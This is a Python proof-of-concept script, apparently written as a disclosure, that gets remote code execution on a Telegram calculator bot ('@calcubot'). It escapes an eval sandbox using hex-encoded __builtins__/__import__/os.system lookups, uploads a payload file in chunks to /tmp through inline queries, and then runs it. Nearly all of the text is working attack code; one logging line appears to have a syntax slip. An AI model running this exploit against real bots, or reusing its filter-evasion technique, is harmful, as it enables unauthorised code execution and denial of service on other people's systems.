
# @calcubot PoC RCE exploit
# -> Discovered and written by artxdev
# -> Behaviour: RCE and DoS exploit with escaping the sandbox
# -> Fix: using "evalidate" package for secure eval in Python (easiest fix)
# -> Date: 20.07.2024
#
####################################
#
# @ https://github.com/artxdev0

import pyrogram
import pyrolog
import time

####

# get these values from https://my.telegram.org
API_ID    = -1
API_HASH  = ''

####

logger = pyrolog.get_colored_logger()

# command base to execute the payload
exec_command = '''\
vars(vars(globals( )['\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f'])\
['\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f']('\\x6f\\x73'))['\\x73\\x79\\x73\\x74\\x65\\x6d']\
('{payload}')\
'''

# max length of the inline query to the bot - 256
max_payload_size = 256 - len(exec_command.format(payload=''))

# filename of the file that will be written on the target
fn = 'a.py'

# payload to write the data to the file
write_payload = 'echo -n "{data}">>/tmp/{fn}'

# size of the bytes chunk
bytes_per_payload = int((max_payload_size - len(write_payload.format(data='', fn=fn))) / 12)

# path to the payload
payload_path = 'payload.py'

# time to sleep between sending next chunk
bc_time = 0.7

####

app = pyrogram.Client(
  'cbot-exploit', api_id=API_ID, api_hash=API_HASH
)


def hexify(b: str) -> str:
  h = b.encode().hex()
  return ''.join([f'\\x{h[i]}{h[i+1]}' for i in range(0, len(h), 2)])


async def main():

  async with app:
    with open(payload_path) as f:

      # reading payload by chunks to pass the limit of the telegram inline queries
      b = f.read(bytes_per_payload)
      while b:

        # generating payload
        payload = exec_command.format(payload=hexify(write_payload.format(data=b, fn=fn)))
        logger.info('Length of the payload => {}', len(payload))

        while 1:
          try:

            result = await app.get_inline_bot_results('calcubot', query=payload)
            logger.debug('Inline results:\n{}'result)
            break
          except Exception as e:
            logger.warn('Exception has occured', exc=e)
            logger.warn('Sleeping for {} seconds...', 5)
            time.sleep(5)
        if len(result.results) != 3:
          logger.error('Result is unsuccessful!')
          return
        time.sleep(bc_time)
        b = f.read(bytes_per_payload)


async def main2():

  async with app:
    payload = exec_command.format(payload=hexify('python3 /tmp/a.py'))
    r = await app.get_inline_bot_results('calcubot', query=payload)
    print(r)

if __name__ == '__main__':
  app.run(main())
  app.run(main2())
